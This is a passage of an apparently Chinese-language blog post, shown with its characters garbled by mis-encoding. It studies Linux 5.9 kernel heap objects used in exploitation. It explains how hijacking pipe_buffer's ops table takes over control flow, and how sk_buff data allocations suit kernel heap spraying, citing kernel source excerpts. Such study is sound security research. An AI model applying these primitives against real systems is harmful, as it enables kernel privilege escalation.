<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨<code>read</code>å¯¹åº”çš„<code>pipe_read</code>å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä»è€Œè°ƒç”¨<code>pipe_buf_release</code>å°†<code>buf-&gt;ops</code>æ¸…ç©ºã€‚</p>
<p>ğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†<code>pipe_buf_release</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡<code>read</code>å°†ç®¡é“<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥<code>release</code>å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>è€Œå½“<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„<code>pipe_buf_release</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª<code>buf-&gt;ops</code>å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„<code>relase</code>å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„<code>pipe_buf_operations</code>ç»“æ„ä¸­æœ‰æåˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>é‚£ä¹ˆå¦‚æœåŠ«æŒäº†<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚</p>
<p>ä¸è¿‡<code>pipe</code>ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬<code>bsauce</code>è¯´æ˜¯åœ¨<code>struct pipe_buffer</code>ç»“æ„ä¸‹<code>buf</code>çš„<code>page</code>é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„<code>kmalloc</code>å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„<code>sk_buff</code>æœ‰ç‚¹ä¸åŒã€‚</p>

        <h2 id="8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š"   >
          <a href="#8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="headerlink" title="8.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š"></a>8.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª<code>socketpair</code>ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯<code>socket</code>ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ<code>pipe</code>éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ•°æ®ä¼ è¾“æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šå•å·¥ï¼Œå‘é€ç«¯<code>fd[1]</code>å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯<code>fd[0]</code>æ¥æ”¶æ•°æ®</li>
<li><code>socketpair</code>ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚</li>
</ul>
</li>
<li>æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šç”±<code>flag</code>æ¥å®šä¹‰ä¸åŒæ¨¡å¼</li>
<li><code>socketpair</code>ï¼šé»˜è®¤é˜»å¡çŠ¶æ€</li>
</ul>
</li>
</ul>
<p>æ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ<code>pipe()</code>å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹<code>socketpair</code>çš„è°ƒç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-1"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-1"   >
          <a href="#â‘ åˆ›å»º-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-1" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤å¿…é¡»</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå’Œ<code>pipe</code>ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨<code>write/read</code>å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é‡Šæ”¾-2"   >
          <a href="#â‘¡é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-2" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°å’Œ<code>pipe</code>æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      <p>åœ¨è°ƒç”¨<code>socketpair</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨<code>write</code>æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚</p>

        <h4 id="â‘ åˆ†é…-1"   >
          <a href="#â‘ åˆ†é…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…-1" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>åœ¨è°ƒç”¨<code>write</code>è¿›è¡Œæ•°æ®å†™å…¥æ—¶</p>
<p>å‡½æ•°é“¾ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶</span><br></pre></td></tr></table></div></figure>

<p>åœ¨<code>unix_stream_sendmsg</code>å¼€å§‹åˆ†å‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//ç›¸å…³æ£€æŸ¥éƒ¨åˆ†</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-å†…å­˜ç”³è¯·"   >
          <a href="#A-å†…å­˜ç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <p>å…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>è¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„<code>__alloc_skb</code>å‡½æ•°ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜</span></span><br><span class="line">    <span class="comment">//ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += å¯¹é½ä¹‹åçš„0x140</span></span><br><span class="line">    <span class="comment">//é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼</span></span><br><span class="line">    <span class="comment">//è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—</span></span><br><span class="line">    <span class="comment">//å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°</span></span><br><span class="line">    <span class="comment">//åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li><code>sk_buff</code>ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± <code>skbuff_fclone_cache/skbuff_head_cache</code>ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶</li>
<li><code>skb-&gt;data</code>ä¸ºå®é™…çš„æ•°æ®ç»“æ„<ul>
<li><code>size</code>ï¼š<code>0x140+n*0x40</code>(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚</li>
<li>å †å—ç”³è¯·ï¼šèµ°<code>kmalloc</code>è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚</li>
</ul>
</li>
